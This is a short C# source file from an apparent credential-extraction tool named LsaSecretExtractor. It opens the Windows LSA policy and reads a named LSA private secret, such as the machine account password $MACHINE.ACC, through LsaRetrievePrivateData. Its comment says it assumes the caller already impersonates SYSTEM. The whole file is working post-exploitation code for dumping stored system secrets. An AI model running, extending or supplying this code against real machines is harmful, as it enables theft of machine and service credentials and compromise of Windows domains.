using System;
using System.Runtime.InteropServices;

namespace LsaSecretExtractor
{
    /// <summary>
    /// Reads an LSA private secret (e.g. $MACHINE.ACC) via the LSA Policy API.
    /// Caller must already be impersonating SYSTEM.
    /// </summary>
    internal static class LsaSecret
    {
        public static byte[] Retrieve(string secretName)
        {
            Native.LSA_OBJECT_ATTRIBUTES oa = new Native.LSA_OBJECT_ATTRIBUTES();
            oa.Length = Marshal.SizeOf(typeof(Native.LSA_OBJECT_ATTRIBUTES));

            IntPtr policyHandle;
            uint status = Native.LsaOpenPolicy(IntPtr.Zero, ref oa, Native.POLICY_GET_PRIVATE_INFORMATION, out policyHandle);
            if (status != 0)
            {
                int win = Native.LsaNtStatusToWinError(status);
                throw new System.ComponentModel.Win32Exception(win,
                    "LsaOpenPolicy failed (NTSTATUS 0x" + status.ToString("x8") + ").");
            }

            IntPtr privateData = IntPtr.Zero;
            try
            {
                Native.LSA_UNICODE_STRING key = Native.InitUnicodeString(secretName);
                try
                {
                    status = Native.LsaRetrievePrivateData(policyHandle, ref key, out privateData);
                }
                finally
                {
                    if (key.Buffer != IntPtr.Zero)
                        Marshal.FreeHGlobal(key.Buffer);
                }

                if (status != 0)
                {
                    int win = Native.LsaNtStatusToWinError(status);
                    throw new System.ComponentModel.Win32Exception(win,
                        "LsaRetrievePrivateData failed (NTSTATUS 0x" + status.ToString("x8") + ").");
                }

                if (privateData == IntPtr.Zero)
                    return null;

                Native.LSA_UNICODE_STRING data =
                    (Native.LSA_UNICODE_STRING)Marshal.PtrToStructure(privateData, typeof(Native.LSA_UNICODE_STRING));

                byte[] result = new byte[data.Length];
                if (data.Length > 0 && data.Buffer != IntPtr.Zero)
                    Marshal.Copy(data.Buffer, result, 0, data.Length);
                return result;
            }
            finally
            {
                if (privateData != IntPtr.Zero)
                    Native.LsaFreeMemory(privateData);
                Native.LsaClose(policyHandle);
            }
        }
    }
}
